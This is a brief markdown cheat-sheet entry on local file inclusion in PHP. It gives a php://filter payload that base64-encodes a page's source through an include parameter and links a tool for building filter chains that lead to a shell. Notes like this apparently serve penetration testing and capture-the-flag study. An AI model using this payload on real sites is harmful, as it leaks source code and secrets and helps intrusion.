---
title: LFI
---

## php://filter
To return the base64 of a file, like the source code of a page, `php://filter` can be used like this:

`view.php?page=php://filter/convert.base64-encode/resource=index.php`

### Adding data to output using filter
[Tool](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)
